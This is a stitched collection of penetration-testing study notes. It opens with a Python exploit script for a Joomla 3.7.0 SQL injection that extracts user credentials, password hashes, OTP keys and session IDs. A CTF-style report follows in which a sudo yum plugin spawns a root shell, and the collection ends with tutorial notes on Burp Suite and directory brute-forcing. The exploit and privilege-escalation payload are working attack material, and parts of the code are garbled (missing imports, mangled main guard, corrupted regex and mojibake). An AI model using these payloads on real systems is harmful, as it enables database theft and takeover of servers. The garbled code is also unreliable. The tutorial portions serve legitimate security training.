import time
import binascii
def extract_token(resp):
                  match = re.search(r'name="([a-f0-9]{32})" value="1"', resp.text, re.S)
                  if match is None:
                                    print(" [!] Cannot find CSRF token")
                                    return None
                  return match.group(1)
def parse_options():
                  parser = argparse.ArgumentParser(description='Jooma Exploit')
                  parser.add_argument('url', help='Base URL for Joomla site')
                  return parser.parse_args()
def build_sqli(colname, morequery):
                  return "(SELECT " + colname + " " + morequery + ")"
def joomla_370_sqli_extract(options, sess, token, colname, morequery):
                  sqli = build_sqli("LENGTH("+colname+")", morequery)
                  length = joomla_370_sqli(options, sess, token, sqli)
                  if not length:
                                    return None
                  length = int(length)
                  maxbytes = 30
                  offset = 0
                  result = ''
                  while length > offset:
                                    sqli = build_sqli("HEX(MID(%s,%d,%d))" % (colname, offset + 1, 16), morequery)
                                    value = joomla_370_sqli(options, sess, token, sqli)
                                    if not value:
                                                     print(" [!] Failed to retrieve string for query:", sqli)
                                                     return None
                                    value = binascii.unhexlify(value).decode("utf-8")
                                    result += value
                                    offset += len(value)
                  return result
def joomla_370_sqli(options, sess, token, sqli):
                  sqli_full = "UpdateXML(2, concat(0x3a," + sqli + ", 0x3a), 1)"
                  data = {
                                    'option': 'com_fields',
                                    'view': 'fields',
                                    'layout': 'modal',
                                    'list[fullordering]': sqli_full,
                                    token: '1',
                  }
                  resp = sess.get(options.url + "/index.php?option=com_fields&view=fields&layout=modal", params=data, allow_redirects=False)
                  match = re.search(r'XPATH syntax error:\s'($\n+)\s'\s*</bl', resp.text, re.S)
                  if match:
                                    match = match.group(1).strip()
                                    if match[0] != ':' and match[-1] != ':':
                                                     return None
                                    return match[1:-1]
def extract_joomla_tables(options, sess, token):
                  tables = list()
                  first = False
                  offset = 0
                  while True:
                                    result = joomla_370_sqli_extract(options, sess, token, "TABLE_NAME", "FROM information_schema.tables WHERE TABLE_NAME LIKE 0x257573657273 LIMIT " + str(offset) + ",1" )
                                    if result is None:
                                                     if first:
                                                                       print("[!] Failed to retrieve first table name!")
                                                                       return False
                                                     break
                                    tables.append(result)
                                    print("  -  Found table:", result)
                                    first = False
                                    offset += 1
                  return tables
def extract_joomla_users(options, sess, token, table_name):
                  users = list()
                  offset = 0
                  first = False
                  print("  -  Extracting users from", table_name)
                  while True:
                                    result = joomla_370_sqli_extract(options, sess, token, "CONCAT(id,0x7c,name,0x7c,username,0x7c,email,0x7c,password,0x7c,otpKey,0x7c,otep)", "FROM %s ORDER BY registerDate ASC LIMIT %d,1" % (table_name, offset) )                     
                                    if result is None:
                                                     if first:
                                                                       print("[!] Failed to retrieve user from table!")
                                                                       return False
                                                     break
                                    result = result.split('|')
                                    print(" [$] Found user",result)
                                    first = False
                                    offset += 1
                                    users.append(result)
                  return users
def extract_joomla_sessions(options, sess, token, table_name):
                  sessions = list()
                  offset = 0
                  first = False
                  print("  -  Extracting sessions from", table_name)
                  while True:
                                    result = joomla_370_sqli_extract(options, sess, token, "CONCAT(userid,0x7c,session_id,0x7c,username)", "FROM %s WHERE guest = 0 LIMIT %d,1" % (table_name, offset) )                     
                                    if result is None:
                                                     if first:
                                                                       print("[!] Failed to retrieve session from table!")
                                                                       return False
                                                     break
                                    result = result.split('|')
                                    print(" [$] Found session", result)
                                    first = False
                                    offset += 1
                                    sessions.append(result)
                  return sessions
def pwn_joomla_again(options):
                  sess = requests.Session()
                  print(" [-] Fetching CSRF token")
                  resp = sess.get(options.url + "/index.php/component/users/?view=login")
                  token = extract_token(resp)
                  if not token:
                                    return False
                  # Verify that we can perform SQLi
                  print(" [-] Testing SQLi")        
                  result = joomla_370_sqli(options, sess, token, "128+127")        
                  if result != "255":
                                    print(" [!] Could not find SQLi output!")
                                    return False
                  tables = extract_joomla_tables(options, sess, token)
                  for table_name in tables:
                                    table_prefix = table_name[:-5]
                                    extract_joomla_users(options, sess, token, table_name)
                                    extract_joomla_sessions(options, sess, token, table_prefix + 'session')
                  return True
def print_logo():
                  clear = "\x1b[0m"
                  colors = [31, 32, 33, 34, 35, 36]
                  logo = """                                                                                                                   
    .---.    .-'''-.        .-'''-.                                                          
    |   |   '       \     '       \                            .---.                       
    '---' /   / '.   \  /   / '.   \  __     _   /|        |   |            .          
    .---..   |     \  ' .   |     \  ' |  |/  .'   . ||        |   |          .'|          
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |          
    |   |\    \     / / \    \     / / |  |  |  |  |  |||      |   |        | |          
    |   | .    ..' /   .    ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.   
    **|   |    '-...-'       '-...-'   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. **  
    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |  
    |   |                              ||  ||  |__|||\    / '|   | .'.''| | | |     | |  
 _.'   '                                              |/'..' / '---'/ /   | || |     | |  
|      '                                               '  '-'       \ ._,\ '/| '.    | '. 
|____.'                                                                --'  " '---'   '---'
"""
                  for line in logo.split("\n"):
                                    sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
                                    #time.sleep(0.05)
def main(base_url): 
                  options = parse_options()
                  options.url = options.url.rstrip('/')
                  print_logo()
                  pwn_joomla_again(options)
if name == "main":
                  sys.exit(main("http://192.168.10.100:8080/joomla"))

Additional Priv Esc info
Vulnerability Exploited:
Vulnerability Explanation(**ì·¨ì•½ì„± ì„¤ëª…)**:  yum sudo vulnerability
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
Vulnerability Fix:
We are currently distributing the latest version that improves this vulnerability, so you can resolve the vulnerability by updating the version.
Severity: Important
Steps to reproduce the attack:
After connecting to the system, I checked and found that I had apache permissions, but I could not access the jjameson folder or the root folder. I didn't have permission to run sudo -l, and there was nothing in crontab to escalate to change permissions.


As a result, the password I used to access the existing website was of no use. After checking some directories and files, Iâ€™ve headed to the website directory to check the configuration files:
The â€˜configuration.phpâ€™ file sounded interesting, so after a check, Iâ€™ve got some credentials:

they arenâ€™t useful for the root user, but maybe we can use them with the jjameson user:

We can see that we can uso yum with sudo privileges. Letâ€™s check the gtfobins to see if there is a way of exploiting this in order to escalate our privileges

When an attack was carried out using the exploit described above, privileges were successfully stolen:
[jjameson@dailybugle ~]$ TF=$(mktemp -d) [jjameson@dailybugle ~]$ cat >$TF/x<<EOF > [main] > plugins=1 > pluginpath=$TF > pluginconfpath=$TF > EOF [jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF > [main] > enabled=1 > EOF [jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF > import os > import yum > from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE > requires_api_version='2.1' > def init_hook(conduit): >   os.execl('/bin/sh','/bin/sh') > EOF [jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y Loaded plugins: y No plugin match for: y ë³µì‚¬
In Result

Exploit Code:
[jjameson@dailybugle ~]$ TF=$(mktemp -d) [jjameson@dailybugle ~]$ cat >$TF/x<<EOF > [main] > plugins=1 > pluginpath=$TF > pluginconfpath=$TF > EOF [jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF > [main] > enabled=1 > EOF [jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF > import os > import yum > from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE > requires_api_version='2.1' > def init_hook(conduit): >   os.execl('/bin/sh','/bin/sh') > EOF [jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y Loaded plugins: y No plugin match for: y ë³µì‚¬

item.title: Basic Concepts of Burp Suite
item.description:
In this chapter, we will learn about a web application called Burp Suite.
We will also explore Burp Proxy, which is the core component of this framework.



Simply put, Burp Suite is a Java-based framework designed to provide a one-stop-shop for web application penetration testing. In many ways, this goal is achieved because Burp is considered an industry-standard tool for real-world web app security assessments. Burp Suite is also very commonly used when evaluating mobile applications. The same attractive features for web app testing almost perfectly translate to testing APIs (Application Programming Interfaces) in most mobile apps.

At its most basic level, Burp can capture and manipulate all traffic between the attacker and the web server. This is the core of the framework. Once a request is captured, you can choose to send it to various other parts of the Burp Suite framework. This ability to intercept, view, and modify requests before they are sent to the target server (or, in some cases, before the response is received in the browser) makes Burp Suite ideal for all kinds of manual web app testing.

We will be using the Community version.


Burp Community has a relatively limited feature set compared to the Professional edition, but it still offers many excellent tools. These include:

Proxy: Burp Proxy, the most well-known aspect of the Burp suite, allows you to intercept and modify requests/responses while interacting with web applications.
Repeater: Another well-known Burp feature, Repeater lets you capture, modify, and resend the same request multiple times. This feature is crucial when you need to craft payloads through trial and error (e.g., in SQL Injection) or test the functionality of an endpoint against vulnerabilities.
Intruder: Although strictly limited in speed in Burp Community, Intruder allows you to flood an endpoint with requests. This is often used for brute-force attacks or fuzzing endpoints.
Decoder: Less frequently used than the features mentioned above, Decoder is still a useful tool for transforming data by decoding captured information or encoding payloads before sending them to the target. While other services can perform similar tasks, doing it directly within Burp Suite can be highly efficient.
Comparer: As the name suggests, Comparer allows you to compare two pieces of data at the word or byte level. This isnâ€™t unique to Burp Suite, but sending potentially large pieces of data to a comparison tool with a single keyboard shortcut can significantly speed up the process.
Sequencer: Used to evaluate the randomness of tokens such as session cookie values or other randomly generated data, Sequencer can highlight vulnerabilities if the algorithm doesnâ€™t generate sufficiently random values.
In addition to its numerous built-in features, the Java codebase makes it very easy to write extensions to add functionality to the Burp framework. Extensions can be written in Java, Python (using the Jython interpreter), or Ruby (using the JRuby interpreter). The Burp Suite Extender module not only allows for quick and easy loading of these extensions but also provides a marketplace (known as the "BApp Store") to download third-party modules. Many of these extensions require a professional license, but there are still plenty that can be integrated with Burp Community. For example, Logger++ can extend Burp Suiteâ€™s built-in logging capabilities.


When you open Burp Suite and agree to the terms of service, a window will appear asking you to choose a project type.
This window doesnâ€™t offer many options in Burp Community. With Burp Pro, you can save work to disk or load a previously saved project at this point. However, with Burp Community, you can only click "Next."
In the next window, you can choose the configuration for Burp Suite. Itâ€™s generally perfect to leave this at its default settings:
Clicking "Start Burp" will open the main Burp Suite interface!

When you first open Burp Suite, you might see a training options screen. These are worth reading if you have the time.
If not (and in subsequent sessions regardless), youâ€™ll be presented with a somewhat overwhelming Burp dashboard.

Donâ€™t be surprised if this doesnâ€™t make sense right away; it will soon!
The dashboard interface is divided into four quadrants.


The tasks menu allows you to define background tasks that Burp Suite will perform while you use the application. In the Pro version, you can also create on-demand scans. The default "Live Passive Crawl" (which automatically logs visited pages) is suitable for use with this module.
The event log provides information about the tasks Burp Suite is performing (e.g., starting the proxy) and all connections being made through Burp.
The issue activity section is exclusive to Burp Pro. Burp Community doesnâ€™t offer anything here, but in Burp Professional, it lists all vulnerabilities discovered by the automated scanner. They are ranked by severity and can be filtered based on Burp's confidence in the vulnerability of the components.
The recommendations section provides detailed information on discovered vulnerabilities, references, and suggested resolutions. You can then export this to a report.
Clicking on an example vulnerability in the issue activity section will look something like this:


In various tabs and windows of Burp Suite, you can find small help icons (a question mark inside a circle).
Clicking these will open a new window with help on the section. For example:



Navigating the Burp Suite GUI is primarily done using the top menu bar.

You can switch modules (refer to the top row of the attached image). If the selected module has more than one sub-tab, you can choose the sub-tab using the second menu bar that appears directly below the original menu bar (the bottom row in the image above). Module-specific settings are generally provided in these sub-tabs (e.g., in the case of proxy options).
You can also view multiple tabs individually by displaying them in separate windows. Click "Window" in the application menu at the top of the screen, then select "Detach" for the tab.

You can reattach them in the same way.
In addition to the menu bar, Burp Suite also has keyboard shortcuts to quickly navigate to main tabs. By default, these are:



Before diving into the proxy, let's look at the options available for configuring Burp Suite.

Global settings can be found in the User Options tab on the top menu bar.
Project-specific settings can be found in the Project Options tab.
User options are applied every time Burp Suite is opened. Conversely, project options apply only to the current project. Given that Burp Community doesnâ€™t allow saving projects, this means project options are reset each time Burp is closed.

There are too many options to cover all of them, so letâ€™s look at the available categories and highlight some more important settings. Weâ€™ll start with the User Options tab.

Here, settings apply globally (i.e., they control the Burp Suite application overall). This means that most can be overridden by project-specific settings.
The User Options tab has four main sub-sections:

Connections: This sub-tab allows you to control how Burp connects to targets. For example, you can set up proxy connections for Burp Suite, which is very useful if you want to use a proxy server to connect to the Burp proxy. This is useful for adding security layers or bypassing firewalls.
HTTP: This section allows you to configure various aspects of HTTP requests and responses, including custom headers and timeouts.
Sessions: This tab manages cookies and session handling, including how Burp Suite handles session tokens. You can also import and export session tokens if necessary.
Misc: This tab is for various miscellaneous settings, such as the display of the Burp Suite interface and the ability to update extensions.

Let's dive into the Project Options tab.
Here, settings are specific to the current project. These settings override the global (user) settings for the current project only. For example, this tab contains options for handling how Burp Suite manages the target site and its content.
The Project Options tab includes the following sub-sections:

Sessions: This section is useful for defining how Burp Suite handles session management on a project level. This is crucial when dealing with authentication tokens or maintaining session integrity during testing.
HTTP: This tab allows you to configure settings that apply to HTTP traffic specific to the current project. This includes configuring request and response modifications, custom headers, and more.
Scope: This section defines which targets Burp Suite should focus on. You can set up specific domains or URL patterns that Burp Suite will include or exclude from its scope.
Target: This tab allows you to define how Burp Suite interacts with the target application. You can configure settings related to how Burp Suite scans and interacts with the target.

In conclusion, the various options and settings in Burp Suite allow you to tailor the tool to fit your specific needs for web application security testing. Understanding and configuring these options effectively is crucial for optimizing your testing process and ensuring comprehensive coverage of potential security issues.

item.title: 2. Content Discovery
item.description:
What is content in web application security? Content can be many things like files, videos, pictures, backups, website features, and more. When we talk about content searching, we are not talking about the things you can see on a website. Content refers to things that are not immediately presented to general users.
For example, it could be a page or portal for administrators, previous versions of the website, backup files, configuration files, admin panels, etc.
The three main ways to search for content on a website are:
Manually
Automated
OSINT (Open-Source Intelligence)



There are several directories you can manually check on a website to find more content.
Robot.txt
The robots.txt file is a document that informs search engines about the pages that should be displayed in search engine results or restricts certain search engines from crawling a website. It is common to limit specific areas of a website so they are not displayed in search engine results. These pages could be areas like the management portal for website customers or files. This file provides a great list of locations on a website that the owner does not want us, as penetration testers, to find.



The favicon is a small icon displayed in the browser's address bar or tab, used as a website logo.
Sometimes, when building a website using a framework, the default favicon remains if the developer does not replace it with a custom favicon. This can reveal which framework is being used.
OWASP hosts a database of common framework icons that can be used to identify the target by the favicon. Once you know the framework, you can use external resources to learn more about it.
Practice
First, I accessed the site provided in the practice within artbox. After accessing it, I entered the address of the favicon that appeared in the source into the curl command within artbox.

By doing this, you can confirm the key value. If you look up the key value found above in the OWASP favicon database provided in the practice, you can find out which framework is being used. *Tip: You can use the clipboard provided by artbox to copy and paste, making it easier to proceed with the practice.



Unlike the robots.txt file, which limits what search engine crawlers can see, the sitemap.xml file provides a list of all the files that the website owner wants to be listed by search engines. This may include areas of the website that are harder to navigate or old web pages that are no longer in use but are still functioning in the background.


HTTP Headers

When a request is made to a web server, the server returns various HTTP headers. These headers can sometimes contain useful information, such as the web server software and the programming/scripting language being used. In the example below, you can see that the web server is running NGINX version 1.18.0 and PHP version 7.4.3. This information can be used to find vulnerable versions of the software in use.
The practice only involves sending a request with curl, so I won't explain further.

Framework Stack

Once you have identified the framework used by the website, either from the favicon example above or from clues in the page source such as comments, copyright notices, or credits, you can search for the framework's website. From there, you can learn more about the software and other information, helping you search for more content.
Practice

First, follow the link provided in the practice to see if there is a link to the framework's website in the source file comments.
If you follow that link, you will see a web page with a documentation section.

When you see this screen, you will find that if the framework is installed, you can log in as an admin at /thm-framework-login. You can access it by adding this link to the existing web page path and logging in.

You will get an answer like the one below.


There are also external resources that can help you find information about the target website. These resources are often referred to as OSINT (Open-Source Intelligence) because they are free tools for gathering information.
Google Hacking / Dorking
Google Hacking/Dorking leverages Google's advanced search engine features to select specific content. For example, by using the site: filter (e.g., site
.com), you can select results from a specific domain name. Then, by combining it with specific search terms (e.g., admin site
.com admin), you can return results only from the tryhackme.com website that contain the word "admin." You can also combine multiple filters. Here are additional filters you can use.




Wappalyzer (https://www.wappalyzer.com/) is an online tool and browser extension that helps identify technologies used on a website, such as frameworks, content management systems (CMS), payment processors, and more.



The Wayback Machine (https://archive.org/web/) is a historical archive of websites dating back to the late 1990s. You can search by domain name and see all the times the service has scraped and saved the content of a web page. This service can help you find old pages that may still be active on the current website. It's not only used by security professionals but also by many others. I didn't expect to encounter this while studying.


GitHub
To understand GitHub, you must first understand Git. Git is a version control system. It tracks changes to files in a project. It makes teamwork easier by allowing each team member to see what others are editing and what changes have been made to files. Once users complete their changes, they commit them with a message, and then others can pull those changes to their local systems. GitHub is an internet-hosted version of Git. Repositories can be set to public or private with various access controls. You can use GitHub's search function to find repositories related to the company or website name, which may contain source code, passwords, or other content that you have not yet discovered.
Many developers are familiar with this site. I also use GitHub for version control of most personal projects, so it feels even more familiar.


= S3 buckets are a storage service provided by Amazon AWS, allowing people to store files and static website content in the cloud that can be accessed via HTTP and HTTPS. File owners can set access permissions to make files public, private, or writable. Sometimes, these access permissions are misconfigured, allowing accidental public access to files that should not be accessible. S3 buckets are formatted as http(s)://{name}.s3.amazonaws.com/, where {name} is determined by the owner. S3 buckets can be searched in various ways, such as by looking for URLs in the page source of a website or a GitHub repository or by automating the process. One common automation method is to use common terms like {name}-assets, {name}-www, {name}-public, {name}-private, etc., after the company name.


What is automated search? Automated search is the process of using tools to search for content instead of doing it manually. This process typically involves sending hundreds, thousands, or millions of requests to a web server, making it automated. These requests check for the presence of files or directories on the website, providing access to resources that you did not know existed. This process is made possible by using a resource called a word list.
What is a word list? A word list is a text file that contains a long list of commonly used words. It can cover various use cases. For example, a password word list contains the most commonly used passwords, while we need a list of the most commonly used directory and file names to find content. A great word list resource pre-installed in the THM AttackBox is maintained by Daniel Miessler at https://github.com/danielmiessler/SecLists.
, ffuf, dirb, and gobuster were used in the practice. Just follow the instructions on the site for practice.
It's faster than manual searching, so it seems good for quickly finding vulnerabilities.
Using ffuf
user@machine$ ffuf -u http://MACHINE_IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt , This can be helpful when searching for specific content.
Using dirb
user@machine$ dirb HOST_IP_ADDRESS /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
Using gobuster
user@machine$ gobuster dir --url [http://HOST_IP_ADDRESS/] /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
